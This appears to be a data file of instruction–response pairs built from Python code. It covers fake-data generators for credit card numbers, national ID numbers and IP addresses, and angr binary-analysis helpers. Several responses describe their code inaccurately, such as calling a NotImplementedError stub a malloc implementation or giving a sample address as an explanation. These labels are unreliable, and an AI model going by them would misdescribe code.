{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the provider s name of the credit card.", "response": "def credit_card_provider(self, card_type=None):\n        \"\"\" Returns the provider's name of the credit card. \"\"\"\n        if card_type is None:\n            card_type = self.random_element(self.credit_card_types.keys())\n        return self._credit_card_type(card_type).name"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef credit_card_number(self, card_type=None):\n        card = self._credit_card_type(card_type)\n        prefix = self.random_element(card.prefixes)\n        number = self._generate_number(self.numerify(prefix), card.length)\n        return number", "response": "Returns a valid credit card number."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef credit_card_security_code(self, card_type=None):\n        sec_len = self._credit_card_type(card_type).security_code_length\n        return self.numerify('#' * sec_len)", "response": "Returns a security code string."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _credit_card_type(self, card_type=None):\n        if card_type is None:\n            card_type = self.random_element(self.credit_card_types.keys())\n        elif isinstance(card_type, CreditCard):\n            return card_type\n        return self.credit_card_types[card_type]", "response": "Returns a random credit card type instance."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate a random CC number.", "response": "def _generate_number(self, prefix, length):\n        \"\"\"\n        'prefix' is the start of the CC number as a string, any number of digits.\n        'length' is the length of the CC number to generate. Typically 13 or 16\n        \"\"\"\n        number = prefix\n        # Generate random char digits\n        number += '#' * (length - len(prefix) - 1)\n        number = self.numerify(number)\n        reverse = number[::-1]\n        # Calculate sum\n        tot = 0\n        pos = 0\n        while pos < length - 1:\n            tot += Provider.luhn_lookup[reverse[pos]]\n            if pos != (length - 2):\n                tot += int(reverse[pos + 1])\n            pos += 2\n        # Calculate check digit\n        check_digit = (10 - (tot % 10)) % 10\n        number += str(check_digit)\n        return number"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef company_business_id(self):\n        def calculate_checksum(number):\n            \"\"\"Calculate the checksum using mod 11,2 method\"\"\"\n            factors = [7, 9, 10, 5, 8, 4, 2]\n            sum_ = 0\n            for x, y in zip(number, factors):\n                sum_ = sum_ + int(x) * y\n            if sum_ % 11 == 0:\n                return '0'\n            else:\n                return str(11 - sum_ % 11)\n\n        first_digit = str(self.random_digit_not_null())\n        body = first_digit + self.bothify('######')\n        cs = calculate_checksum(body)\n        return body + '-' + str(cs)", "response": "Returns a string that is used to identify the company business identity code for the current company."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate a 11 digits Belgian SSN called rjksregisternummer", "response": "def ssn(self):\n        \"\"\"\n        Returns a 11 digits Belgian SSN called \"rijksregisternummer\" as a string\n\n        The first 6 digits represent the birthdate with (in order) year, month and day.\n        The second group of 3 digits is represents a sequence number (order of birth).\n        It is even for women and odd for men.\n        For men the range starts at 1 and ends 997, for women 2 until 998.\n        The third group of 2 digits is a checksum based on the previous 9 digits (modulo 97).\n        Divide those 9 digits by 97, subtract the remainder from 97 and that's the result.\n        For persons born in or after 2000, the 9 digit number needs to be proceeded by a 2\n        (add 2000000000) before the division by 97.\n\n        \"\"\"\n        # see http://nl.wikipedia.org/wiki/Burgerservicenummer (in Dutch)\n        def _checksum(digits):\n            res = 97 - (digits % 97)\n            return res\n\n        # Generate a date (random)\n        mydate = self.generator.date()\n        # Convert it to an int\n        elms = mydate.split(\"-\")\n        # Adjust for year 2000 if necessary\n        if elms[0][0] == '2':\n            above = True\n        else:\n            above = False\n        # Only keep the last 2 digits of the year\n        elms[0] = elms[0][2:4]\n        # Simulate the gender/sequence - should be 3 digits\n        seq = self.generator.random_int(1, 998)\n        # Right justify sequence and append to list\n        seq_str = \"{:0>3}\".format(seq)\n        elms.append(seq_str)\n        # Now convert list to an integer so the checksum can be calculated\n        date_as_int = int(\"\".join(elms))\n        if above:\n            date_as_int += 2000000000\n        # Generate checksum\n        s = _checksum(date_as_int)\n        s_rjust = \"{:0>2}\".format(s)\n        # return result as a string\n        elms.append(s_rjust)\n        return \"\".join(elms)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef road_address(self):\n        pattern = self.random_element(self.road_address_formats)\n        return self.generator.parse(pattern)", "response": ":example \uc138\uc885\ud2b9\ubcc4\uc790\uce58\uc2dc \ub3c4\uc6c05\ub85c 19 (\uc5b4\uc9c4\ub3d9)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef address_detail(self):\n        pattern = self.bothify(self.random_element(\n            self.address_detail_formats))\n        return self.generator.parse(pattern)", "response": ":example \uac00\ub098\uc544\ud30c\ud2b8 \uac00\ub3d9 102\ud638"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncalculate the checksum of a Canadian Social Insurance Number.", "response": "def checksum(sin):\n    \"\"\"\n    Determine validity of a Canadian Social Insurance Number.\n    Validation is performed using a modified Luhn Algorithm.  To check\n    the Every second digit of the SIN is doubled and the result is\n    summed.  If the result is a multiple of ten, the Social Insurance\n    Number is considered valid.\n\n    https://en.wikipedia.org/wiki/Social_Insurance_Number\n    \"\"\"\n\n    # Remove spaces and create a list of digits.\n    checksumCollection = list(sin.replace(' ', ''))\n    checksumCollection = [int(i) for i in checksumCollection]\n\n    # Discard the last digit, we will be calculating it later.\n    checksumCollection[-1] = 0\n\n    # Iterate over the provided SIN and double every second digit.\n    # In the case that doubling that digit results in a two-digit\n    # number, then add the two digits together and keep that sum.\n\n    for i in range(1, len(checksumCollection), 2):\n        result = checksumCollection[i] * 2\n        if result < 10:\n            checksumCollection[i] = result\n        else:\n            checksumCollection[i] = result - 10 + 1\n\n    # The appropriate checksum digit is the value that, when summed\n    # with the first eight values, results in a value divisible by 10\n\n    check_digit = 10 - (sum(checksumCollection) % 10)\n    check_digit = (0 if check_digit == 10 else check_digit)\n\n    return check_digit"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nproduces a hostname with specified number of subdomain levels.", "response": "def hostname(self, levels=1):\n        \"\"\"\n        Produce a hostname with specified number of subdomain levels.\n\n        >>> hostname()\n        db-01.nichols-phillips.com\n        >>> hostname(0)\n        laptop-56\n        >>> hostname(2)\n        web-12.williamson-hopkins.jackson.com\n        \"\"\"\n        if levels < 1:\n            return self.random_element(self.hostname_prefixes) + '-' + self.numerify('##')\n        return self.random_element(self.hostname_prefixes) + '-' + self.numerify('##') + '.' + self.domain_name(levels)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef domain_name(self, levels=1):\n        if levels < 1:\n            raise ValueError(\"levels must be greater than or equal to 1\")\n        if levels == 1:\n            return self.domain_word() + '.' + self.tld()\n        else:\n            return self.domain_word() + '.' + self.domain_name(levels - 1)", "response": "Produce an Internet domain name with the specified number of subdomain levels."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef url(self, schemes=None):\n        if schemes is None:\n            schemes = ['http', 'https']\n\n        pattern = '{}://{}'.format(\n            self.random_element(schemes) if schemes else \"\",\n            self.random_element(self.url_formats),\n        )\n\n        return self.generator.parse(pattern)", "response": "Generate a random url string."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _random_ipv4_address_from_subnet(self, subnet, network=False):\n        address = str(\n            subnet[self.generator.random.randint(\n                0, subnet.num_addresses - 1,\n            )],\n        )\n\n        if network:\n            address += '/' + str(self.generator.random.randint(\n                subnet.prefixlen,\n                subnet.max_prefixlen,\n            ))\n            address = str(ip_network(address, strict=False))\n\n        return address", "response": "Generates a random IPv4 address or network with a valid CIDR\n            from within a given subnet."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of IPv4 networks from another list of networks.", "response": "def _exclude_ipv4_networks(self, networks, networks_to_exclude):\n        \"\"\"\n        Exclude the list of networks from another list of networks\n        and return a flat list of new networks.\n\n        :param networks: List of IPv4 networks to exclude from\n        :param networks_to_exclude: List of IPv4 networks to exclude\n        :returns: Flat list of IPv4 networks\n        \"\"\"\n        for network_to_exclude in networks_to_exclude:\n            def _exclude_ipv4_network(network):\n                \"\"\"\n                Exclude a single network from another single network\n                and return a list of networks. Network to exclude\n                comes from the outer scope.\n\n                :param network: Network to exclude from\n                :returns: Flat list of IPv4 networks after exclusion.\n                          If exclude fails because networks do not\n                          overlap, a single element list with the\n                          orignal network is returned. If it overlaps,\n                          even partially, the network is excluded.\n                \"\"\"\n                try:\n                    return list(network.address_exclude(network_to_exclude))\n                except ValueError:\n                    # If networks overlap partially, `address_exclude`\n                    # will fail, but the network still must not be used\n                    # in generation.\n                    if network.overlaps(network_to_exclude):\n                        return []\n                    else:\n                        return [network]\n\n            networks = list(map(_exclude_ipv4_network, networks))\n\n            # flatten list of lists\n            networks = [\n                item for nested in networks for item in nested\n            ]\n\n        return networks"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nproduce a random IPv4 address or network with a valid CIDR.", "response": "def ipv4(self, network=False, address_class=None, private=None):\n        \"\"\"\n        Produce a random IPv4 address or network with a valid CIDR.\n\n        :param network: Network address\n        :param address_class: IPv4 address class (a, b, or c)\n        :param private: Public or private\n        :returns: IPv4\n        \"\"\"\n        if private is True:\n            return self.ipv4_private(address_class=address_class,\n                                     network=network)\n        elif private is False:\n            return self.ipv4_public(address_class=address_class,\n                                    network=network)\n\n        # if neither private nor public is required explicitly,\n        # generate from whole requested address space\n        if address_class:\n            all_networks = [_IPv4Constants._network_classes[address_class]]\n        else:\n            # if no address class is choosen, use whole IPv4 pool\n            all_networks = [ip_network('0.0.0.0/0')]\n\n        # exclude special networks\n        all_networks = self._exclude_ipv4_networks(\n            all_networks,\n            _IPv4Constants._excluded_networks,\n        )\n\n        # choose random network from the list\n        random_network = self.generator.random.choice(all_networks)\n\n        return self._random_ipv4_address_from_subnet(random_network, network)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a private IPv4.", "response": "def ipv4_private(self, network=False, address_class=None):\n        \"\"\"\n        Returns a private IPv4.\n\n        :param network: Network address\n        :param address_class: IPv4 address class (a, b, or c)\n        :returns: Private IPv4\n        \"\"\"\n        # compute private networks from given class\n        supernet = _IPv4Constants._network_classes[\n            address_class or self.ipv4_network_class()\n        ]\n\n        private_networks = [\n            subnet for subnet in _IPv4Constants._private_networks\n            if subnet.overlaps(supernet)\n        ]\n\n        # exclude special networks\n        private_networks = self._exclude_ipv4_networks(\n            private_networks,\n            _IPv4Constants._excluded_networks,\n        )\n\n        # choose random private network from the list\n        private_network = self.generator.random.choice(private_networks)\n\n        return self._random_ipv4_address_from_subnet(private_network, network)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef ipv4_public(self, network=False, address_class=None):\n        # compute public networks\n        public_networks = [_IPv4Constants._network_classes[\n            address_class or self.ipv4_network_class()\n        ]]\n\n        # exclude private and excluded special networks\n        public_networks = self._exclude_ipv4_networks(\n            public_networks,\n            _IPv4Constants._private_networks +\n            _IPv4Constants._excluded_networks,\n        )\n\n        # choose random public network from the list\n        public_network = self.generator.random.choice(public_networks)\n\n        return self._random_ipv4_address_from_subnet(public_network, network)", "response": "Returns a public IPv4 excluding private blocks."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef ipv6(self, network=False):\n        address = str(ip_address(self.generator.random.randint(\n            2 ** IPV4LENGTH, (2 ** IPV6LENGTH) - 1)))\n        if network:\n            address += '/' + str(self.generator.random.randint(0, IPV6LENGTH))\n            address = str(ip_network(address, strict=False))\n        return address", "response": "Produce a random IPv6 address or network with a valid CIDR"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a random URL to the image of the given size.", "response": "def image_url(self, width=None, height=None):\n        \"\"\"\n        Returns URL to placeholder image\n        Example: http://placehold.it/640x480\n        \"\"\"\n        width_ = width or self.random_int(max=1024)\n        height_ = height or self.random_int(max=1024)\n        placeholder_url = self.random_element(self.image_placeholder_services)\n        return placeholder_url.format(width=width_, height=height_)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef format(self, formatter, *args, **kwargs):\n        # TODO: data export?\n        return self.get_formatter(formatter)(*args, **kwargs)", "response": "Format a log entry using the given formatter."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nperforms a forward execution and perform alias analysis.", "response": "def _alias_analysis(self, mock_sp=True, mock_bp=True):\n        \"\"\"\n        Perform a forward execution and perform alias analysis. Note that this analysis is fast, light-weight, and by no\n        means complete. For instance, most arithmetic operations are not supported.\n\n        - Depending on user settings, stack pointer and stack base pointer will be mocked and propagated to individual\n          tmps.\n\n        :param bool mock_sp: propagate stack pointer or not\n        :param bool mock_bp: propagate stack base pointer or not\n        :return: None\n        \"\"\"\n\n        state = SimLightState(\n            regs={\n                self._arch.sp_offset: self._arch.initial_sp,\n                self._arch.bp_offset: self._arch.initial_sp + 0x2000, # TODO: take care of the relation between sp and bp\n            },\n            temps={},\n            options={\n            'mock_sp': mock_sp,\n            'mock_bp': mock_bp,\n            }\n        )\n\n        for stmt_idx, stmt in list(enumerate(self._statements)):\n            self._forward_handler_stmt(stmt, state)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _slice(self):\n\n        regs = set(self._target_regs)\n        tmps = set(self._target_tmps)\n        stack_offsets = set(self._target_stack_offsets)\n\n        state = SimLightState(regs=regs, temps=tmps, stack_offsets=stack_offsets)\n\n        for stmt_idx, stmt in reversed(list(enumerate(self._statements))):\n            if self._backward_handler_stmt(stmt, state):\n                self.stmts.insert(0, stmt)\n                self.stmt_indices.insert(0, stmt_idx)\n\n                if self._inslice_callback:\n                    self._inslice_callback(stmt_idx, stmt, self.inslice_callback_infodict)\n\n            if not regs and not tmps and not stack_offsets:\n                break\n\n        self.final_regs = state.regs\n        self.final_stack_offsets = state.stack_offsets", "response": "Slice the internal state."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef prepare_function_symbol(self, symbol_name, basic_addr=None):\n        if self.project.loader.main_object.is_ppc64_abiv1:\n            if basic_addr is not None:\n                pointer = self.project.loader.memory.unpack_word(basic_addr)\n                return pointer, basic_addr\n\n            pseudo_hookaddr = self.project.loader.extern_object.get_pseudo_addr(symbol_name)\n            pseudo_toc = self.project.loader.extern_object.allocate(size=0x18)\n            self.project.loader.extern_object.memory.pack_word(\n                AT.from_mva(pseudo_toc, self.project.loader.extern_object).to_rva(), pseudo_hookaddr)\n            return pseudo_hookaddr, pseudo_toc\n        else:\n            if basic_addr is None:\n                basic_addr = self.project.loader.extern_object.get_pseudo_addr(symbol_name)\n            return basic_addr, basic_addr", "response": "Prepares the address space with the data necessary to perform relocations pointing to the given symbol."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef initialize_segment_register_x64(self, state, concrete_target):\n        _l.debug(\"Synchronizing fs segment register\")\n        state.regs.fs = self._read_fs_register_x64(concrete_target)", "response": "Initialize the fs register in the angr to the value of the fs register in the concrete target."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates a GDT in the state memory and populate the segment registers.", "response": "def initialize_gdt_x86(self,state,concrete_target):\n        \"\"\"\n        Create a GDT in the state memory and populate the segment registers.\n        Rehook the vsyscall address using the real value in the concrete process memory\n\n        :param state:               state which will be modified\n        :param concrete_target:     concrete target that will be used to read the fs register\n        :return:\n        \"\"\"\n        _l.debug(\"Creating fake Global Descriptor Table and synchronizing gs segment register\")\n        gs = self._read_gs_register_x86(concrete_target)\n        gdt = self.generate_gdt(0x0, gs)\n        self.setup_gdt(state, gdt)\n\n        # Synchronize the address of vsyscall in simprocedures dictionary with the concrete value\n        _vsyscall_address = concrete_target.read_memory(gs + 0x10, state.project.arch.bits / 8)\n        _vsyscall_address = struct.unpack(state.project.arch.struct_fmt(), _vsyscall_address)[0]\n        state.project.rehook_symbol(_vsyscall_address, '_vsyscall')\n\n        return gdt"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nmerges this node with the other node returning a new node that spans the both.", "response": "def merge(self, other):\n        \"\"\"\n        Merges this node with the other, returning a new node that spans the both.\n        \"\"\"\n        new_node = self.copy()\n        new_node.size += other.size\n        new_node.instruction_addrs += other.instruction_addrs\n        # FIXME: byte_string should never be none, but it is sometimes\n        # like, for example, patcherex test_cfg.py:test_fullcfg_properties\n        if new_node.byte_string is None or other.byte_string is None:\n            new_node.byte_string = None\n        else:\n            new_node.byte_string += other.byte_string\n        return new_node"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef new_array(state, element_type, size):\n        size_bounded = SimSootExpr_NewArray._bound_array_size(state, size)\n        # return the reference of the array base\n        # => elements getting lazy initialized in the javavm memory\n        return SimSootValue_ArrayBaseRef(heap_alloc_id=state.javavm_memory.get_new_uuid(),\n                                         element_type=element_type,\n                                         size=size_bounded)", "response": "Allocates a new array in memory and returns the reference to the base."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts recovered reaching conditions from claripy ASTs to ailment Expressions", "response": "def _convert_claripy_bool_ast(self, cond):\n        \"\"\"\n        Convert recovered reaching conditions from claripy ASTs to ailment Expressions\n\n        :return: None\n        \"\"\"\n\n        if isinstance(cond, ailment.Expr.Expression):\n            return cond\n\n        if cond.op == \"BoolS\" and claripy.is_true(cond):\n            return cond\n        if cond in self._condition_mapping:\n            return self._condition_mapping[cond]\n\n        _mapping = {\n            'Not': lambda cond_: ailment.Expr.UnaryOp(None, 'Not', self._convert_claripy_bool_ast(cond_.args[0])),\n            'And': lambda cond_: ailment.Expr.BinaryOp(None, 'LogicalAnd', (\n                self._convert_claripy_bool_ast(cond_.args[0]),\n                self._convert_claripy_bool_ast(cond_.args[1]),\n            )),\n            'Or': lambda cond_: ailment.Expr.BinaryOp(None, 'LogicalOr', (\n                self._convert_claripy_bool_ast(cond_.args[0]),\n                self._convert_claripy_bool_ast(cond_.args[1]),\n            )),\n            'ULE': lambda cond_: ailment.Expr.BinaryOp(None, 'CmpULE',\n                                                          tuple(map(self._convert_claripy_bool_ast, cond_.args)),\n                                                          ),\n            '__le__': lambda cond_: ailment.Expr.BinaryOp(None, 'CmpLE',\n                                                          tuple(map(self._convert_claripy_bool_ast, cond_.args)),\n                                                          ),\n            'UGT': lambda cond_: ailment.Expr.BinaryOp(None, 'CmpUGT',\n                                                          tuple(map(self._convert_claripy_bool_ast, cond_.args)),\n                                                          ),\n            '__gt__': lambda cond_: ailment.Expr.BinaryOp(None, 'CmpGT',\n                                                          tuple(map(self._convert_claripy_bool_ast, cond_.args)),\n                                                          ),\n            '__eq__': lambda cond_: ailment.Expr.BinaryOp(None, 'CmpEQ',\n                                                          tuple(map(self._convert_claripy_bool_ast, cond_.args)),\n                                                          ),\n            '__ne__': lambda cond_: ailment.Expr.BinaryOp(None, 'CmpNE',\n                                                          tuple(map(self._convert_claripy_bool_ast, cond_.args)),\n                                                          ),\n            '__xor__': lambda cond_: ailment.Expr.BinaryOp(None, 'Xor',\n                                                          tuple(map(self._convert_claripy_bool_ast, cond_.args)),\n                                                          ),\n            'BVV': lambda cond_: ailment.Expr.Const(None, None, cond_.args[0], cond_.size()),\n            'BoolV': lambda cond_: ailment.Expr.Const(None, None, True, 1) if cond_.args[0] is True\n                                                                        else ailment.Expr.Const(None, None, False, 1),\n        }\n\n        if cond.op in _mapping:\n            return _mapping[cond.op](cond)\n        raise NotImplementedError((\"Condition variable %s has an unsupported operator %s. \"\n                                   \"Consider implementing.\") % (cond, cond.op))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _extract_jump_targets(stmt):\n\n        targets = [ ]\n\n        # FIXME: We are assuming all jump targets are concrete targets. They may not be.\n\n        if isinstance(stmt, ailment.Stmt.Jump):\n            targets.append(stmt.target.value)\n        elif isinstance(stmt, ailment.Stmt.ConditionalJump):\n            targets.append(stmt.true_target.value)\n            targets.append(stmt.false_target.value)\n\n        return targets", "response": "Extracts concrete jump targets from a Jump or ConditionalJump statement."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef malloc(self, sim_size):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.malloc.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "A somewhat faithful implementation of libc malloc."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef set_stack(self, stack_dump, stack_top):\n        data = self._read_data(stack_dump)\n        self.real_stack_top = stack_top\n        addr = stack_top - len(data) # Address of the bottom of the stack\n        l.info(\"Setting stack from 0x%x up to %#x\", addr, stack_top)\n        #FIXME: we should probably make we don't overwrite other stuff loaded there\n        self._write(addr, data)", "response": "Set the stack dump of the current session."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nset the heap dump to the given base address.", "response": "def set_heap(self, heap_dump, heap_base):\n        \"\"\"\n        Heap dump is a dump of the heap from gdb, i.e. the result of the\n        following gdb command:\n\n        ``dump binary memory [stack_dump] [begin] [end]``\n\n        :param heap_dump:   The dump file.\n        :param heap_base:   The start address of the heap in the gdb session.\n        \"\"\"\n        # We set the heap at the same addresses as the gdb session to avoid pointer corruption.\n        data = self._read_data(heap_dump)\n        self.state.heap.heap_location = heap_base + len(data)\n        addr = heap_base\n        l.info(\"Set heap from 0x%x to %#x\", addr, addr+len(data))\n        #FIXME: we should probably make we don't overwrite other stuff loaded there\n        self._write(addr, data)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsetting the data of the current object to the given address.", "response": "def set_data(self, addr, data_dump):\n        \"\"\"\n        Update any data range (most likely use is the data segments of loaded objects)\n        \"\"\"\n        data = self._read_data(data_dump)\n        l.info(\"Set data from 0x%x to %#x\", addr, addr+len(data))\n        self._write(addr, data)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef set_regs(self, regs_dump):\n\n        if self.real_stack_top == 0 and self.adjust_stack is True:\n            raise SimStateError(\"You need to set the stack first, or set\"\n                    \"adjust_stack to False. Beware that in this case, sp and bp won't be updated\")\n\n        data = self._read_data(regs_dump)\n        rdata = re.split(b\"\\n\", data)\n        for r in rdata:\n            if r == b\"\":\n                continue\n            reg = re.split(b\" +\", r)[0].decode()\n            val = int(re.split(b\" +\", r)[1],16)\n            try:\n                self.state.registers.store(reg, claripy.BVV(val, self.state.arch.bits))\n            # Some registers such as cs, ds, eflags etc. aren't supported in angr\n            except KeyError as e:\n                l.warning(\"Reg %s was not set\", e)\n\n        self._adjust_regs()", "response": "Initialize the state registers within the state object."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _adjust_regs(self):\n        if not self.adjust_stack:\n            return\n\n        bp = self.state.arch.register_names[self.state.arch.bp_offset]\n        sp = self.state.arch.register_names[self.state.arch.sp_offset]\n\n        stack_shift = self.state.arch.initial_sp - self.real_stack_top\n        self.state.registers.store(sp, self.state.regs.sp + stack_shift)\n\n        if not self.omit_fp:\n            self.state.registers.store(bp, self.state.regs.bp + stack_shift)", "response": "Adjust sp and bp registers w. r. t. stack difference between GDB session and angr."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nparses a strongly connected graph and return a list of Loop objects.", "response": "def _parse_loop_graph(self, subg, bigg):\n        \"\"\"\n        Create a Loop object for a strongly connected graph, and any strongly\n        connected subgraphs, if possible.\n\n        :param subg:    A strongly connected subgraph.\n        :param bigg:    The graph which subg is a subgraph of.\n\n        :return:        A list of Loop objects, some of which may be inside others,\n                        but all need to be documented.\n        \"\"\"\n        loop_body_nodes = list(subg.nodes())[:]\n        entry_edges = []\n        break_edges = []\n        continue_edges = []\n        entry_node = None\n        for node in loop_body_nodes:\n            for pred_node in bigg.predecessors(node):\n                if pred_node not in loop_body_nodes:\n                    if entry_node is not None and entry_node != node:\n                        l.warning(\"Bad loop: more than one entry point (%s, %s)\", entry_node, node)\n                        return None, []\n                    entry_node = node\n                    entry_edges.append((pred_node, node))\n                    subg.add_edge(pred_node, node)\n            for succ_node in bigg.successors(node):\n                if succ_node not in loop_body_nodes:\n                    break_edges.append((node, succ_node))\n                    subg.add_edge(node, succ_node)\n        if entry_node is None:\n            entry_node = min(loop_body_nodes, key=lambda n: n.addr)\n            l.info(\"Couldn't find entry point, assuming it's the first by address (%s)\", entry_node)\n\n        acyclic_subg = subg.copy()\n        for pred_node in subg.predecessors(entry_node):\n            if pred_node in loop_body_nodes:\n                continue_edge = (pred_node, entry_node)\n                acyclic_subg.remove_edge(*continue_edge)\n                continue_edges.append(continue_edge)\n\n        removed_exits = {}\n        removed_entries = {}\n        tops, alls = self._parse_loops_from_graph(acyclic_subg)\n        for subloop in tops:\n            if subloop.entry in loop_body_nodes:\n                # break existing entry edges, exit edges\n                # re-link in loop object\n                # the exception logic is to handle when you have two loops adjacent to each other\n                # you gotta link the two loops together and remove the dangling edge\n                for entry_edge in subloop.entry_edges:\n                    try:\n                        subg.remove_edge(*entry_edge)\n                    except networkx.NetworkXError:\n                        if entry_edge in removed_entries:\n                            subg.add_edge(removed_entries[entry_edge], subloop)\n                            try:\n                                subg.remove_edge(removed_entries[entry_edge], entry_edge[1])\n                            except networkx.NetworkXError:\n                                pass\n                        else:\n                            raise\n                    else:\n                        subg.add_edge(entry_edge[0], subloop)\n                        removed_entries[entry_edge] = subloop\n                for exit_edge in subloop.break_edges:\n                    try:\n                        subg.remove_edge(*exit_edge)\n                    except networkx.NetworkXError:\n                        if exit_edge in removed_entries:\n                            subg.add_edge(subloop, removed_entries[exit_edge])\n                            try:\n                                subg.remove_edge(exit_edge[0], removed_entries[exit_edge])\n                            except networkx.NetworkXError:\n                                pass\n                        else:\n                            raise\n                    else:\n                        subg.add_edge(subloop, exit_edge[1])\n                        removed_exits[exit_edge] = subloop\n                subg = next(filter(lambda g: entry_node in g.nodes(),\n                        networkx.weakly_connected_component_subgraphs(subg)))\n\n        me = Loop(entry_node,\n             entry_edges,\n             break_edges,\n             continue_edges,\n             loop_body_nodes,\n             subg,\n             tops[:])\n        return me, [me] + alls"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a list of Loop instances that can be extracted from a graph.", "response": "def _parse_loops_from_graph(self, graph):\n        \"\"\"\n        Return all Loop instances that can be extracted from a graph.\n\n        :param graph:   The graph to analyze.\n\n        :return:        A list of all the Loop instances that were found in the graph.\n        \"\"\"\n        outtop = []\n        outall = []\n        for subg in networkx.strongly_connected_component_subgraphs(graph):\n            if len(subg.nodes()) == 1:\n                if len(list(subg.successors(list(subg.nodes())[0]))) == 0:\n                    continue\n            thisloop, allloops = self._parse_loop_graph(subg, graph)\n            if thisloop is not None:\n                outall += allloops\n                outtop.append(thisloop)\n        return outtop, outall"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_ref(cls, state, obj_alloc_id, field_class_name, field_name, field_type):\n        # resolve field\n        field_class = state.javavm_classloader.get_class(field_class_name)\n        field_id = resolve_field(state, field_class, field_name, field_type)\n        # return field ref\n        return cls.from_field_id(obj_alloc_id, field_id)", "response": "Resolve the field within the given state."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _euclidean_dist(vector_a, vector_b):\n    dist = 0\n    for (x, y) in zip(vector_a, vector_b):\n        dist += (x-y)*(x-y)\n    return math.sqrt(dist)", "response": "Calculates the euclidean distance between two lists of numbers."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_closest_matches(input_attributes, target_attributes):\n    closest_matches = {}\n\n    # for each object in the first set find the objects with the closest target attributes\n    for a in input_attributes:\n        best_dist = float('inf')\n        best_matches = []\n        for b in target_attributes:\n            dist = _euclidean_dist(input_attributes[a], target_attributes[b])\n            if dist < best_dist:\n                best_matches = [b]\n                best_dist = dist\n            elif dist == best_dist:\n                best_matches.append(b)\n        closest_matches[a] = best_matches\n\n    return closest_matches", "response": "Returns a dictionary of objects in the input_attributes to the closest objects in the target_attributes."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the Levenshtein distance between two lists or strings", "response": "def _levenshtein_distance(s1, s2):\n    \"\"\"\n    :param s1:  A list or string\n    :param s2:  Another list or string\n    :returns:    The levenshtein distance between the two\n    \"\"\"\n    if len(s1) > len(s2):\n        s1, s2 = s2, s1\n    distances = range(len(s1) + 1)\n    for index2, num2 in enumerate(s2):\n        new_distances = [index2 + 1]\n        for index1, num1 in enumerate(s1):\n            if num1 == num2:\n                new_distances.append(distances[index1])\n            else:\n                new_distances.append(1 + min((distances[index1],\n                                             distances[index1+1],\n                                             new_distances[-1])))\n        distances = new_distances\n    return distances[-1]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _normalized_levenshtein_distance(s1, s2, acceptable_differences):\n    if len(s1) > len(s2):\n        s1, s2 = s2, s1\n        acceptable_differences = set(-i for i in acceptable_differences)\n    distances = range(len(s1) + 1)\n    for index2, num2 in enumerate(s2):\n        new_distances = [index2 + 1]\n        for index1, num1 in enumerate(s1):\n            if num2 - num1 in acceptable_differences:\n                new_distances.append(distances[index1])\n            else:\n                new_distances.append(1 + min((distances[index1],\n                                             distances[index1+1],\n                                             new_distances[-1])))\n        distances = new_distances\n    return distances[-1]", "response": "This function calculates the levenshtein distance between two lists."}
